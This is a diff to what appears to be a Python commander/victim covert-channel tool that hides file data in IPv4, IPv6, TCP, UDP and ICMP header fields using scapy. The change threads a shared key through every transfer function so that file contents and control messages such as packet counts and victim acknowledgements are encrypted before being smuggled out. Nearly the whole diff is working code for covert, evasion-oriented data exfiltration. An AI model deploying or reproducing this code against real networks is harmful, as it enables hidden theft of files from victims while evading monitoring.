@@ -1368,7 +1368,7 @@ def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
     # DIFFERENT SNIFFS: For IPv4 Headers/Field
     if constants.IPV4 in choices:
         # Get total count of packets
-        count = get_packet_count(cmdr_socket)
+        count = get_packet_count(cmdr_socket, shared_key)
 
         if constants.SOURCE_ADDRESS_FIELD in choices:
             received_packets = sniff(filter="dst host {} and dst port {}"
@@ -1380,10 +1380,11 @@ def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
     if constants.IPV6 in choices:
         source_ipv6_ip, source_ipv6_port, cmdr_ipv6_addr = receive_get_ipv6_script(cmdr_socket,
                                                                                    cmdr_ip,
-                                                                                   cmdr_port)
+                                                                                   cmdr_port,
+                                                                                   shared_key)
 
         # Get total count of packets
-        count = get_packet_count(cmdr_socket)
+        count = get_packet_count(cmdr_socket, shared_key)
 
         if constants.NEXT_HEADER in choices:
             received_packets = sniff(filter="src host {} and dst host {}"
@@ -1396,7 +1397,7 @@ def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
 
     # DIFFERENT SNIFFS: For TCP Headers/Field
     if constants.TCP in choices:
-        count = get_packet_count(cmdr_socket)
+        count = get_packet_count(cmdr_socket, shared_key)
 
         if constants.SOURCE_PORT_FIELD in choices:
             received_packets = sniff(filter="tcp and dst host {} and dst port {} and "
@@ -1422,7 +1423,7 @@ def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
 
     # DIFFERENT SNIFFS: For UDP Headers/Field
     if constants.UDP in choices:
-        count = get_packet_count(cmdr_socket)
+        count = get_packet_count(cmdr_socket, shared_key)
 
         if constants.DESTINATION_PORT_FIELD in choices:
             received_packets = sniff(filter="udp and dst host {} and src host {}"
@@ -1435,7 +1436,7 @@ def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
 
     # DIFFERENT SNIFFS: For ICMP Header/Fields
     if constants.ICMP in choices:
-        count = get_packet_count(cmdr_socket)
+        count = get_packet_count(cmdr_socket, shared_key)
 
         received_packets = sniff(filter="icmp and dst host {} and src host {}"
                                  .format(source_ip, cmdr_ip),
@@ -1453,9 +1454,9 @@ def receive_file_covert(cmdr_socket: socket.socket, cmdr_ip: str,
         print(constants.TRANSFER_SUCCESS_MSG.format(filename))
         print(constants.AWAIT_NEXT_OP_MSG)
         print(constants.MENU_CLOSING_BANNER)
-        cmdr_socket.send(constants.VICTIM_ACK.encode())
+        cmdr_socket.send(encrypt_string(constants.VICTIM_ACK, shared_key).encode())
     else:
-        cmdr_socket.send(constants.FILE_CANNOT_OPEN_TO_SENDER.encode())
+        cmdr_socket.send(encrypt_string(constants.FILE_CANNOT_OPEN_TO_SENDER, shared_key).encode())
         print(constants.AWAIT_NEXT_OP_MSG)
         print(constants.MENU_CLOSING_BANNER)
 
@@ -2140,7 +2141,8 @@ def __transfer_file_dst_addr_error_handler(field: str, header: str):
 def transfer_file_ipv6_version(client_sock: socket.socket,
                                dest_ip: str,
                                dest_port: int,
-                               file_path: str):
+                               file_path: str,
+                               shared_key: bytes):
     """
     Hides file data covertly in IPv6 headers using the
     version field.
@@ -2160,14 +2162,16 @@ def transfer_file_ipv6_version(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2179,7 +2183,7 @@ def transfer_file_ipv6_version(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2192,7 +2196,8 @@ def transfer_file_ipv6_version(client_sock: socket.socket,
 def transfer_file_ipv6_traffic_class(client_sock: socket.socket,
                                      dest_ip: str,
                                      dest_port: int,
-                                     file_path: str):
+                                     file_path: str,
+                                     shared_key: bytes):
     """
     Hides file data covertly in IPv6 headers using the
     traffic class field.
@@ -2212,14 +2217,16 @@ def transfer_file_ipv6_traffic_class(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2231,7 +2238,7 @@ def transfer_file_ipv6_traffic_class(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2244,7 +2251,8 @@ def transfer_file_ipv6_traffic_class(client_sock: socket.socket,
 def transfer_file_ipv6_flow_label(client_sock: socket.socket,
                                   dest_ip: str,
                                   dest_port: int,
-                                  file_path: str):
+                                  file_path: str,
+                                  shared_key: bytes):
     """
     Hides file data covertly in IPv6 headers using the
     flow label field.
@@ -2264,14 +2272,16 @@ def transfer_file_ipv6_flow_label(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2283,7 +2293,7 @@ def transfer_file_ipv6_flow_label(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2296,7 +2306,8 @@ def transfer_file_ipv6_flow_label(client_sock: socket.socket,
 def transfer_file_ipv6_payload_length(client_sock: socket.socket,
                                       dest_ip: str,
                                       dest_port: int,
-                                      file_path: str):
+                                      file_path: str,
+                                      shared_key: bytes):
     """
     Hides file data covertly in IPv6 headers using the
     payload length field.
@@ -2316,14 +2327,16 @@ def transfer_file_ipv6_payload_length(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2335,7 +2348,7 @@ def transfer_file_ipv6_payload_length(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2348,7 +2361,8 @@ def transfer_file_ipv6_payload_length(client_sock: socket.socket,
 def transfer_file_ipv6_next_header(client_sock: socket.socket,
                                    dest_ip: str,
                                    dest_port: int,
-                                   file_path: str):
+                                   file_path: str,
+                                   shared_key: bytes):
     """
     Hides file data covertly in IPv6 headers using the
     next header field.
@@ -2368,14 +2382,16 @@ def transfer_file_ipv6_next_header(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2387,7 +2403,7 @@ def transfer_file_ipv6_next_header(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2400,7 +2416,8 @@ def transfer_file_ipv6_next_header(client_sock: socket.socket,
 def transfer_file_ipv6_hop_limit(client_sock: socket.socket,
                                  dest_ip: str,
                                  dest_port: int,
-                                 file_path: str):
+                                 file_path: str,
+                                 shared_key: bytes):
     """
     Hides file data covertly in IPv6 headers using the
     hop limit field.
@@ -2420,14 +2437,16 @@ def transfer_file_ipv6_hop_limit(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2439,7 +2458,7 @@ def transfer_file_ipv6_hop_limit(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2452,7 +2471,8 @@ def transfer_file_ipv6_hop_limit(client_sock: socket.socket,
 def transfer_file_ipv6_src_addr(client_sock: socket.socket,
                                 dest_ip: str,
                                 dest_port: int,
-                                file_path: str):
+                                file_path: str,
+                                shared_key: bytes):
     """
     Hides file data covertly in IPv6 headers using the
     source address field.
@@ -2479,14 +2499,16 @@ def transfer_file_ipv6_src_addr(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2498,7 +2520,7 @@ def transfer_file_ipv6_src_addr(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2551,7 +2573,8 @@ def transfer_file_tcp_src_port(client_sock: socket.socket,
                                dest_ip: str,
                                dest_port: int,
                                src_port: int,
-                               file_path: str):
+                               file_path: str,
+                               shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     source port field.
@@ -2574,14 +2597,16 @@ def transfer_file_tcp_src_port(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2593,7 +2618,7 @@ def transfer_file_tcp_src_port(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2607,7 +2632,8 @@ def transfer_file_tcp_dst_port(client_sock: socket.socket,
                                dest_ip: str,
                                dest_port: int,
                                src_port: int,
-                               file_path: str):
+                               file_path: str,
+                               shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     destination port field.
@@ -2630,14 +2656,16 @@ def transfer_file_tcp_dst_port(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2649,7 +2677,7 @@ def transfer_file_tcp_dst_port(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2663,7 +2691,8 @@ def transfer_file_tcp_seq_num(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
-                              file_path: str):
+                              file_path: str,
+                              shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     sequence number field.
@@ -2686,14 +2715,16 @@ def transfer_file_tcp_seq_num(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2705,7 +2736,7 @@ def transfer_file_tcp_seq_num(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2719,7 +2750,8 @@ def transfer_file_tcp_ack_num(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
-                              file_path: str):
+                              file_path: str,
+                              shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     acknowledgement number field.
@@ -2742,14 +2774,16 @@ def transfer_file_tcp_ack_num(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2761,7 +2795,7 @@ def transfer_file_tcp_ack_num(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2775,7 +2809,8 @@ def transfer_file_tcp_data_offset(client_sock: socket.socket,
                                   dest_ip: str,
                                   dest_port: int,
                                   src_port: int,
-                                  file_path: str):
+                                  file_path: str,
+                                  shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     data-offset field.
@@ -2802,14 +2837,16 @@ def transfer_file_tcp_data_offset(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2821,7 +2858,7 @@ def transfer_file_tcp_data_offset(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2835,7 +2872,8 @@ def transfer_file_tcp_reserved(client_sock: socket.socket,
                                dest_ip: str,
                                dest_port: int,
                                src_port: int,
-                               file_path: str):
+                               file_path: str,
+                               shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     reserved field.
@@ -2858,14 +2896,16 @@ def transfer_file_tcp_reserved(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2877,7 +2917,7 @@ def transfer_file_tcp_reserved(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2891,7 +2931,8 @@ def transfer_file_tcp_flags(client_sock: socket.socket,
                             dest_ip: str,
                             dest_port: int,
                             src_port: int,
-                            file_path: str):
+                            file_path: str,
+                            shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     various control flag fields.
@@ -2918,14 +2959,16 @@ def transfer_file_tcp_flags(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2937,7 +2980,7 @@ def transfer_file_tcp_flags(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -2951,7 +2994,8 @@ def transfer_file_tcp_window_size(client_sock: socket.socket,
                                   dest_ip: str,
                                   dest_port: int,
                                   src_port: int,
-                                  file_path: str):
+                                  file_path: str,
+                                  shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     window size field.
@@ -2974,14 +3018,16 @@ def transfer_file_tcp_window_size(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -2993,7 +3039,7 @@ def transfer_file_tcp_window_size(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3007,7 +3053,8 @@ def transfer_file_tcp_chksum(client_sock: socket.socket,
                              dest_ip: str,
                              dest_port: int,
                              src_port: int,
-                             file_path: str):
+                             file_path: str,
+                             shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     checksum field.
@@ -3030,14 +3077,16 @@ def transfer_file_tcp_chksum(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3049,7 +3098,7 @@ def transfer_file_tcp_chksum(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3063,7 +3112,8 @@ def transfer_file_tcp_urgent_ptr(client_sock: socket.socket,
                                  dest_ip: str,
                                  dest_port: int,
                                  src_port: int,
-                                 file_path: str):
+                                 file_path: str,
+                                 shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     urgent pointer field.
@@ -3086,14 +3136,16 @@ def transfer_file_tcp_urgent_ptr(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3105,7 +3157,7 @@ def transfer_file_tcp_urgent_ptr(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3119,7 +3171,8 @@ def transfer_file_tcp_options(client_sock: socket.socket,
                               dest_ip: str,
                               dest_port: int,
                               src_port: int,
-                              file_path: str):
+                              file_path: str,
+                              shared_key: bytes):
     """
     Hides file data covertly in TCP headers using the
     TimeStamp options field.
@@ -3143,14 +3196,16 @@ def transfer_file_tcp_options(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3164,7 +3219,7 @@ def transfer_file_tcp_options(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3181,7 +3236,8 @@ def transfer_file_udp_src_port(client_sock: socket.socket,
                                dest_ip: str,
                                dest_port: int,
                                src_port: int,
-                               file_path: str):
+                               file_path: str,
+                               shared_key: bytes):
     """
     Hides file data covertly in UDP headers using the
     source port field.
@@ -3204,14 +3260,16 @@ def transfer_file_udp_src_port(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3223,7 +3281,7 @@ def transfer_file_udp_src_port(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3237,7 +3295,8 @@ def transfer_file_udp_dst_port(client_sock: socket.socket,
                                dest_ip: str,
                                dest_port: int,
                                src_port: int,
-                               file_path: str):
+                               file_path: str,
+                               shared_key: bytes):
     """
     Hides file data covertly in UDP headers using the
     destination port field.
@@ -3260,14 +3319,16 @@ def transfer_file_udp_dst_port(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3279,7 +3340,7 @@ def transfer_file_udp_dst_port(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3293,7 +3354,8 @@ def transfer_file_udp_length(client_sock: socket.socket,
                              dest_ip: str,
                              dest_port: int,
                              src_port: int,
-                             file_path: str):
+                             file_path: str,
+                             shared_key: bytes):
     """
     Hides file data covertly in UDP headers using the
     length field.
@@ -3316,14 +3378,16 @@ def transfer_file_udp_length(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3335,7 +3399,7 @@ def transfer_file_udp_length(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3349,7 +3413,8 @@ def transfer_file_udp_chksum(client_sock: socket.socket,
                              dest_ip: str,
                              dest_port: int,
                              src_port: int,
-                             file_path: str):
+                             file_path: str,
+                             shared_key: bytes):
     """
     Hides file data covertly in UDP headers using the
     checksum field.
@@ -3372,14 +3437,16 @@ def transfer_file_udp_chksum(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
@@ -3391,7 +3458,7 @@ def transfer_file_udp_chksum(client_sock: socket.socket,
 
     # d) Send total number of packets to the client
     total_packets = str(len(packets))
-    client_sock.send(total_packets.encode())
+    client_sock.send(encrypt_string(total_packets, shared_key).encode())
 
     # e) Introduce delay to allow scapy to synchronize between send/sniff calls
     time.sleep(1)
@@ -3406,7 +3473,8 @@ def transfer_file_udp_chksum(client_sock: socket.socket,
 
 def transfer_file_icmp_type(client_sock: socket.socket,
                             dest_ip: str,
-                            file_path: str):
+                            file_path: str,
+                            shared_key: bytes):
     """
     Hides file data covertly in ICMP headers using the
     type field.
@@ -3423,14 +3491,16 @@ def transfer_file_icmp_type(client_sock: socket.socket,
     @param file_path:
         A string representing the path of the file
 
+    @param shared_key:
+        The shared key for symmetric encryption/decryption
+
     @return: None
     """
-    # a) Read the content of the file
-    with open(file_path, constants.READ_BINARY_MODE) as file:
-        file_content = file.read()
+    # a) Read and encrypt the content of the file
+    encrypted_data = encrypt_file(file_path, shared_key)
 
     # b) Convert file content to binary
-    binary_data = __bytes_to_bin(file_content)
+    binary_data = __bytes_to_bin(encrypted_data)
 
     # c) Put data in packet
     packets = []
